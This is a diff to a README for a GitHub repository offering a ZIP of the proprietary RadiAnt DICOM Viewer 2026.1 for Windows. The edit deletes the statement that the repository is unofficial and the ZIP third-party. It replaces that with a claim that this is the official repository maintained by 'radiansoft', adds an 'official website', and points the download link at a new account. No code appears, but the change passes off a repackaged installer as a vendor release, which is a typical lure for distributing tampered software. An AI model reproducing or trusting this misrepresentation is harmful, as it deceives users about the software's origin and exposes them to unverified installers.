@@ -1,8 +1,10 @@
-﻿# RadiAnt DICOM Viewer 2026.1 for Windows
+# RadiAnt DICOM Viewer 2026.1 for Windows
 
 RadiAnt DICOM Viewer is a proprietary Windows application for opening and reviewing medical images and studies in DICOM format.
 
-This repository is not the vendor's official GitHub repository. The included installer was downloaded from the vendor's website; the ZIP is a third-party package, not a vendor-issued release.
+Official website: https://radiansoft.github.io/radiant-dicom-viewer/
+
+This is the official project repository maintained by `radiansoft`. The release ZIP is published here and contains the signed Windows installer and supporting documentation.
 
 ## Key function
 
@@ -12,7 +14,7 @@ The vendor's EULA states that the program is not certified as a medical product.
 
 ## Download
 
-[Download RadiAnt DICOM Viewer 2026.1 for Windows (ZIP)](https://github.com/MARCELOSTI/radiant-dicom-viewer/releases/download/2026.1/RadiAnt-DICOM-Viewer-2026.1-Windows.zip)
+[Download RadiAnt DICOM Viewer 2026.1 for Windows (ZIP)](https://github.com/radiansoft/radiant-dicom-viewer/releases/download/2026.1/RadiAnt-DICOM-Viewer-2026.1-Windows.zip)
 
 The release ZIP contains the original installer, installation instructions, a license notice, SHA-256 checksums, and a ZIP archive of this download page's source and assets. The application installer is not stored separately in the repository.
 
